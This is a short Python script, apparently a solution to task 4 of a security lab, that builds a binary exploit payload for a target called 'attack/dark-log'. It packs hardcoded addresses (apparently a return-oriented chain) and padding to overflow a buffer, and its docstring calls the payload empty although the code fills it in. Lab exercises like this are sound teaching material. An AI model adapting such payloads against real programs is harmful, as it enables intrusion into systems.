#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
def p64(x):
    return x.to_bytes(8, 'little')

payload = b""
payload += p64(0x4018a4)
payload += p64(0x4018a3)
payload += p64(4)
payload += p64(0x401677)
payload += p64(0x401834)
payload += b"A" * (256 - len(payload))
payload += (168).to_bytes(4, 'little')
sys.stdout.buffer.write(payload + b"\n")